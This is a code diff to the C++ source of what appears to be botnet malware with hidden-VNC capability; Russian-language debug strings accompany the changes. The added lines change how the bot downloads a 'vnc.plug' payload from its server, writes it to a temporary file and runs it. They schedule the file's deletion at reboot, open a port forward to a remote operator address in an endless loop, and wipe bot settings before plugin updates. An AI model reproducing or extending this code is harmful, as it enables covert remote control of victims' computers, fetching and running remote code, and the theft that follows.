@@ -749,6 +749,7 @@ bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 			LPBYTE Buf = Plugin::Download(PluginName.t_str(), NULL, &Size, true);
 			if (Buf)
 			{
+				BOT::DeleteSettings();
 				bool Result = BOT::UpdateBotPlug(Buf, Size);
 				MemFree(Buf);
 				return Result;
@@ -961,39 +962,51 @@ bool ExecuteRDP(PTaskManager, PCHAR Command, PCHAR Args)
 	return false;
 }
 
+
+
 static char ipServerForVNC[16];
 
 static DWORD WINAPI ProcessVNC(void*)
 {
 	BOT::Initialize(ProcessUnknown);
 
+	TASKDBG("VNC", "Запущен процесс VNC. PID %d", Bot->PID());
+
 	char ipServer[16];
 	m_lstrcpy( ipServer, ipServerForVNC );
 	TASKDBG( "Task", "Run VNC, ip %s", ipServer );
 	DWORD c_data;
 	BYTE* data = Plugin::Download( "vnc.plug", 0, &c_data, false );
+
 //	BYTE* data = File::ReadToBufferA( "c:\\hvnc.exe", c_data );
 	if( data )
 	{
+		TASKDBG( "Task", "vnc.plug downloaded");
 		char fileName[MAX_PATH];
 		File::GetTempName(fileName);
-		if( File::WriteBufferA( fileName, data, c_data ) == c_data )
+		if( File::WriteBufferA(fileName, data, c_data) == c_data)
 		{
 			TASKDBG( "Task", "vnc.plug saved in %s", fileName );
-			if( RunFileA(fileName) )
+			if( RunFileA(fileName))
 			{
 				pMoveFileExA( fileName, 0, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 				if( RunPortForward(ipServer) )
-				{
-					TASKDBG( "Task", "VNC worked" );
-					pSleep(24 * 3600 * 1000);
-				}
+					while (true)
+					{
+						TASKDBG( "Task", "VNC worked" );
+						pSleep(10000);
+                    }
 			}
 			else
 				pDeleteFileA(fileName);
 		}
 		MemFree(data);
 	}
+	else
+	{
+        TASKDBG( "Task", "vnc.plug download error");
+	}
+
 				/*
 				HMEMORYMODULE module = MemoryLoadLibrary(data);
 				if( module )
@@ -1002,6 +1015,7 @@ static DWORD WINAPI ProcessVNC(void*)
 					MemoryFreeLibrary(module);
 				}
 				*/
+	pExitProcess(0);
 	return 0;
 }
 
